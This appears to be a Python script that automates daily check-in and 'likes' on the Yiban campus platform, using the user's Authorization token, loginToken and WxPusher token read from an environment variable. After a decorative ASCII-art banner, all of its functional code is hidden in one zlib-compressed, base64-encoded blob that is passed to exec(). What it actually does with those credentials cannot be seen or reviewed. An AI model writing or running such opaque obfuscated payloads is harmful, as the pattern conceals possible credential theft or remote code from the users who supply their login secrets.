# --encoding:utf-8 -- #
"""
    
    联系方式:110

    易班

    ver 1.0

    2024.6.17

    实现 每日签到 点赞

    环境变量名:yuanshen_yb

    参数:
    Authorization loginToken orgId 其中 orgId位于 含getRecommend的url中
    
    群发wxpusher 提取 appToken topicid 

    格式:export yuanshen_yb = 备注#Authorization#loginToken#appToken#topicid#orgId

    定时 每天9点一次
    cron: 0 0 9 * * ? 

"""

#   --------------------------------一般不动区--------------------------------
#
#                                               #v;;@
#                                           .8@;;;3;;;;&@@u
#                                     ##%$$$$;;;*n8;;$;;;~&$$$$$@&          3@
#                                +@$%$$$$$$$%!;;;%;a$%*;;#$$$$%$$$$%$@!    *n *@n
#                              &$$$$$$$$$$$$$@*;;;$;;;;;@$$%$$$$$$$$$$%$$@%
#                             $$$$$$$$$$$$$$$$;;;;8;;;;$$$$$$$$i#$$%3i!@i@$$@
#                             #$$$$$$$$$$$$$$%$&&&#@@@@$$$$$$$#!!i#%#i!i3#$$$%&.&$
#                             @$$$$$$$$$$$$&@@@@@@@@&$$$$$$$$$%$!6@@iii6!!@@$@$$&.
#                          +&$%$@@@6iiiiizzzzuzzzzzazzzazzui!@@&%$$$$&i%$#@!i@%$$@
#                        #@@&&iiizzuazzaazzz@zzaazaaazazzzzaazzzzii#@$$$$$ii!i!$$%+
#                      @&&&@@uzzzzaazzzzzzi8zzzzazzazazaaizzzzazazzzaiii@$#!#i###
#                      @&&i#zzzazazzizi#@@6^izzzzzaazazu$izazzazzzzzaaz1iii8#$#@%%
#                      +i@zzzaazz11zzi!@+-%3zaaza1zzzi!#iaazz68zzzzzzzzz1iii&&#i$@
#                       i#1zazzza@azi38++. ;iuzzziazz8++*6azzzzzzzzzzzazazzii6&$&$.
#        .3       @    #i@zzzzaa3i@@3     .@&izzziu1#-- -@&###azuuzzaazzzzazzi&&# %^
#       z-i!*       a  ii@azzzzz@-6  @@@@   &@izz%#8- +8   $@3  &!azzzzzaaazzz@   -$#
#      o   !!1  -o  @+!8 @izaazz@ @  *&1    % %iaa#8  #   @@@@~  @izazzzaazzzzi    &$~
#     6    iii      3    .i1auaa! %        +o  -@i%.  @          @;$zazzzzzzaza    @%$.
#     n            !      #!iziiz@  %#;..8$        .  .@        @.a#zzaazzizzz%     $$@
#   * ^            #      va@ii3!ia$  ..                 ;&@@@1   %zzaaaaiizaz@
# ~;% ;           ~ #     @aaaz@#  ......     3           ....   $zzzza1i86azz#    za.@ 6
#     #          a .@@@   &aaaa@               -&@!       .... -6uiiizi#ai@izau    3z @;
#      ~         #        +uuuu!@                             ^++oiii%3-&1i&azz@   61~  &
#      -~        @         @uuu!-i63..                         $#@i+--%3iia!#izzu      * .
#        n       o          &311#iiiii@!                    .---o@#iii%aaaz-   i@&&^
#         @~      @          !31u@ii#i$&@@8!3#;-------++-1##3@ 8@.!iii1aaa&
#           #~;    !      #$#@%336$%#8@%%$$#&63i3n  @!!6668#&$$$$#!ii#aauu#
#        ..   +8~~~;;@@@&.@3#&$&%%#$&8888%&$$%$$%@&$$$$$$$$$$$@88888#uuuu$$-
#             .   .-%   6~@%$$8#$#$$88888888&#$#&a6%$%$#@8888888888@113u@$$$$
#                   1    -z$$$$6366%$%$&%88888&#&u;~;86686686%v%@611!3&$$$$#z  ;u
#                    1--+#^@$$$6$8#%aaai$668688;$&66668686688% a!338&$$$$$v.  .^@
#                      @@@@@$&#@ ^u%!uu%%88866$@#&8666686668%&   -a$&$$$@.  8@#
#                        $&##     @##816666666868#8666666366&$.   3u%$%@&8;*@ %@
#            @   @                 %#@366368$$@66866666666636&;&  @u%3$@#u$u-  o&
#       @ @. @ -v8i%               !6336666663&6666636!66336!66z~  @~#!11uuui1   #
#       @ @  @  @ @               #&&@663666$va$6666!33666666#&$%@  # @!1u33$6!!$  @
#       @ @ @.  @ @   @@@@- @&   @&$@1&6!636a$@1%6663!3333&$z1$$$$@@    +#838#!&v3   v
#       @@@ @ 8 -a@              @%$;&i$&666#n6%;3#3336@&&**#;#$$$#6za    .3$3131 -
#       n -@ @@ i@@.             #$@~%8$$$&@on@@@@$v&$%$$$$$$3n$$&iz%%a&     o33#
#              @   +            +&&@a&$$$%$$ou$$$$$&&~~$$$$1$@;$$&#%%z868$@@!;#3-
#                                v   .@&&$$$&$#%%%&@#&$&$$$$$&;#@@@&%$#%&@   %8u!
#                             !%&       #$&#ou6%!%#  .#&$$$$@       1 @$^
#                            a@ .i-i+ . ^&%%33!8%%%     #&&+       !1@#8@
#                            @$6-@  i#&    -8@@@@#@#^     @&^     %n*!@.
#                           &$$++i$
#                             .@$$%$
#
# ...................................................................
#           堂主保佑             永无BUG
#           堂主镇楼             BUG辟邪
#
#   堂主曰:
#
#        一日复一日，代码何其多！
#        只愿无bug，每日醉成仙！
#
# --------------------------------代码区--------------------------------
try:
    import zlib, base64
    exec(zlib.decompress(base64.b64decode('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')))
except Exception as e:
    print("脚本执行出错：",str(e))
